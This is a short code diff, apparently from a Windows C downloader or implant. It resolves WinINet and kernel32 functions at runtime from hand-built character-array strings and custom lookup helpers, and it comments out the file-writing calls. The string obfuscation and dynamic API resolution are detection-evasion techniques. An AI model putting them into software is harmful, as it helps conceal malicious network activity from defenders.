@@ -54,8 +54,8 @@ void do_request(const char* hostName, const char* resourcePath, const char* targ
 	t_HttpOpenRequestA pHttpOpenRequestA = NULL;
 	t_InternetConnectA pInternetConnectA = NULL;
 	t_InternetOpenA pInternetOpenA = NULL;
-	t_CreateFileA pCreateFileA = NULL;
-	t_WriteFile pWriteFile = NULL;
+	//t_CreateFileA pCreateFileA = NULL;
+	//t_WriteFile pWriteFile = NULL;
 
 	//Create DLL Strings
 	WCHAR strCrypt32[] = { 'C','r','y','p','t','3','2','.','d','l','l', 0x0 };
@@ -70,8 +70,8 @@ void do_request(const char* hostName, const char* resourcePath, const char* targ
 	unsigned char strHttpQueryInfoA[] = { 'H','t','t','p','Q','u','e','r','y','I','n','f','o','A',0x0};
 	unsigned char strInternetReadFile[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0x0};
 	unsigned char strInternetCloseHandle[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e',0x0};
-	unsigned char strCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0x0 };
-	unsigned char strWriteFile[] = { 'W','r','i','t','e','F','i','l','e',0x0 };
+	//unsigned char strCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0x0 };
+	//unsigned char strWriteFile[] = { 'W','r','i','t','e','F','i','l','e',0x0 };
 
 	//load the needed libraries.
 	pLoadLibraryW(strWinInet);
@@ -86,8 +86,8 @@ void do_request(const char* hostName, const char* resourcePath, const char* targ
 	pHttpOpenRequestA = (t_HttpOpenRequestA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strHttpOpenRequestA);
 	pHttpSendRequestA = (t_HttpOpenRequestA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strHttpSendRequestA);
 	pHttpQueryInfoA = (t_HttpQueryInfoA)hlpGetProcAddress(hlpGetModuleHandle(strWinInet), (LPCSTR)strHttpQueryInfoA);
-	pCreateFileA = (t_CreateFileA)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strCreateFileA);
-	pWriteFile = (t_WriteFile)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strWriteFile);
+	//pCreateFileA = (t_CreateFileA)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strCreateFileA);
+	//pWriteFile = (t_WriteFile)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strWriteFile);
 
 
 	//char rand_str[31] = "";
